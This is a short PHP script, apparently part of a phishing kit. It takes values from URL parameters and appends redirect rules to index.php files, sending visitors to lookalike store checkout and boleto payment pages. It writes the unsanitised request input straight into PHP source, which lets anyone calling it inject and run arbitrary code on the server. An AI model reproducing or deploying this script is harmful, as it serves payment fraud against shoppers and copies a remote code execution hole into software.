<?php 
header('Access-Control-Allow-Origin: *');
extract($_GET);

$fp= fopen('index.php', 'a');
fwrite($fp, "if(\$link == '".$www."'){
	header('Location: https://www'.\$rand.'.".$produto."');
	die();
}");
fclose($fp);

$fp= fopen('confirmacao/index.php', 'a');
fwrite($fp, "if(\$link == '".$www."'){
	header('Location: https://www'.\$rand.'.".$produto."carrinho/simplelogin/pagamentoBoleto/acompanhar/pedidos/'.\$pedidov.'/');
	die();
}");
fclose($fp);


//header('Location: '. $_SERVER['HTTP_HOST']);

echo 'Redirect criado ;)';

?>
